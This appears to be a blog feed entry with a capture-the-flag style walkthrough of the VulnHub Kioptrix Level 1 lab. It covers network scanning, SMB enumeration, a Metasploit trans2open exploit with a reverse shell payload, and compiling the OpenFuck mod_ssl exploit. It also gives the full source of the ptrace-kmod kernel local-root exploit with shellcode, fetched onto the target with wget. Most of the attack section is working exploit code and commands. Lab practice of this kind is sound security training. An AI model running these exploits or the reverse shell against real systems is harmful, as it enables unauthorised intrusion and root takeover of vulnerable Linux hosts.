+    <link href="http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1/"/>
+    <updated>2016-06-06T09:21:18-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1</id>
+    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulhub</a></p>
+
+<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>nbtscab</li>
+<li>enum4linux</li>
+<li>Metasploit</li>
+<li>Nikto</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.182 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.182 -p-</code></p>
+
+<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>SMB Attack:</p>
+
+<p>Looks like SMB service is on. Lets start nbtscan to exam SMB.</p>
+
+<p><code>nbtscan 192.168.79.182</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use enum4linux to enumerate smb:</p>
+
+<p><code>enum4linux  -a 192.168.79.182</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the samba version</p>
+
+<p>Now start Metasploit:</p>
+
+<pre><code>msfconsole
+search samba
+use exploit/linux/samba/trans2open
+set rhost 192.168.79.182
+set payload generic/shell_reverse_tcp
+exploit
+</code></pre>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE SMB</p>
+
+<p>mod_ssl exploit:</p>
+
+<p>use nikto to scan:</p>
+
+<p><code>nikto -h 192.168.79.182</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like mod_ssl is vulnerable</p>
+
+<p>search exploits:</p>
+
+<p><code>searchexploit openssl</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now try to compile the c code. Get error. Find a <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">blog</a> to fix it.</p>
+
+<p>now recompile:</p>
+
+<p><code>
+gcc 764.c -o 764 -lcrypto
+</code></p>
+
+<p>run the 764 and it requires to input id for the target&rsquo;s supported box eg: 0x00. In the result of nikto, the box is Apache/1.3.20 (Unix)  (Red-Hat/Linux)</p>
+
+<p>so I can just:</p>
+
+<p><code>./764 -h |grep 1.3.20</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>so we can just 0x6a and 0x0b. Finially got 0x0b works</p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I get the shell, but still not get the root. After analysis, I figure it out that code 764.c download ptrace-kmod.c. compile and execute it. I didn&rsquo;t connect my vm to Internet, so it failed when it tried to download the code. Finally I get the ptrace-kmod.c</p>
+
+<pre><code class="c ptrace-kmod.c">/*
+ * Linux kernel ptrace/kmod local root exploit
+ *
+ * This code exploits a race condition in kernel/kmod.c, which creates
+ * kernel thread in insecure manner. This bug allows to ptrace cloned
+ * process, allowing to take control over privileged modprobe binary.
+ *
+ * Should work under all current 2.2.x and 2.4.x kernels.
+ * 
+ * I discovered this stupid bug independently on January 25, 2003, that
+ * is (almost) two month before it was fixed and published by Red Hat
+ * and others.
+ * 
+ * Wojciech Purczynski &lt;cliph@isec.pl&gt;
+ *
+ * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
+ * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
+ * 
+ * (c) 2003 Copyright by iSEC Security Research
+ */
+
+#include &lt;grp.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;paths.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;linux/user.h&gt;
+
+char cliphcode[] =
+    "\x90\x90\xeb\x1f\xb8\xb6\x00\x00"
+    "\x00\x5b\x31\xc9\x89\xca\xcd\x80"
+    "\xb8\x0f\x00\x00\x00\xb9\xed\x0d"
+    "\x00\x00\xcd\x80\x89\xd0\x89\xd3"
+    "\x40\xcd\x80\xe8\xdc\xff\xff\xff";
+
+#define CODE_SIZE (sizeof(cliphcode) - 1)
+
+pid_t parent = 1;
+pid_t child = 1;
+pid_t victim = 1;
+volatile int gotchild = 0;
+
+void fatal(char * msg)
+{
+    perror(msg);
+    kill(parent, SIGKILL);
+    kill(child, SIGKILL);
+    kill(victim, SIGKILL);
+}
+
+void putcode(unsigned long * dst)
+{
+    char buf[MAXPATHLEN + CODE_SIZE];
+    unsigned long * src;
+    int i, len;
+
+    memcpy(buf, cliphcode, CODE_SIZE);
+    len = readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);
+    if (len == -1)
+        fatal("[-] Unable to read /proc/self/exe");
+
+    len += CODE_SIZE + 1;
+    buf[len] = '\0';
+
+    src = (unsigned long*) buf;
+    for (i = 0; i &lt; len; i += 4)
+        if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)
+            fatal("[-] Unable to write shellcode");
+}
+
+void sigchld(int signo)
+{
+    struct user_regs_struct regs;
+
+    if (gotchild++ == 0)
+        return;
+
+    fprintf(stderr, "[+] Signal caught\n");
+
+    if (ptrace(PTRACE_GETREGS, victim, NULL, &amp;regs) == -1)
+        fatal("[-] Unable to read registers");
+
+    fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);
+
+    putcode((unsigned long *)regs.eip);
+
+    fprintf(stderr, "[+] Now wait for suid shell...\n");
+
+    if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)
+        fatal("[-] Unable to detach from victim");
+
+    exit(0);
+}
+
+void sigalrm(int signo)
+{
+    errno = ECANCELED;
+    fatal("[-] Fatal error");
+}
+
+void do_child(void)
+{
+    int err;
+
+    child = getpid();
+    victim = child + 1;
+
+    signal(SIGCHLD, sigchld);
+
+    do
+        err = ptrace(PTRACE_ATTACH, victim, 0, 0);
+    while (err == -1 &amp;&amp; errno == ESRCH);
+
+    if (err == -1)
+        fatal("[-] Unable to attach");
+
+    fprintf(stderr, "[+] Attached to %d\n", victim);
+    while (!gotchild) ;
+    if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)
+        fatal("[-] Unable to setup syscall trace");
+    fprintf(stderr, "[+] Waiting for signal\n");
+
+    for(;;);
+}
+
+void do_parent(char * progname)
+{
+    struct stat st;
+    int err;
+    errno = 0;
+    socket(AF_SECURITY, SOCK_STREAM, 1);
+    do {
+        err = stat(progname, &amp;st);
+    } while (err == 0 &amp;&amp; (st.st_mode &amp; S_ISUID) != S_ISUID);
+
+    if (err == -1)
+        fatal("[-] Unable to stat myself");
+
+    alarm(0);
+    system(progname);
+}
+
+void prepare(void)
+{
+    if (geteuid() == 0) {
+        initgroups("root", 0);
+        setgid(0);
+        setuid(0);
+        execl(_PATH_BSHELL, _PATH_BSHELL, NULL);
+        fatal("[-] Unable to spawn shell");
+    }
+}
+
+int main(int argc, char ** argv)
+{
+    prepare();
+    signal(SIGALRM, sigalrm);
+    alarm(10);
+
+    parent = getpid();
+    child = fork();
+    victim = child + 1;
+
+    if (child == -1)
+        fatal("[-] Unable to fork");
+
+    if (child == 0)
+        do_child();
+    else
+        do_parent(argv[0]);
+
+    return 0;
+}
+</code></pre>
+
+<p>in target vm /tmp:</p>
+
+<p><code>wget http://192.168.79.173/ptrace-kmod.c</code></p>
+
+<p>&lsquo;gcc ptrace-kmod.c -o attack&rsquo;</p>
+
+<p>run attack:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
+]]></content>
+  </entry>
+  
+</feed>
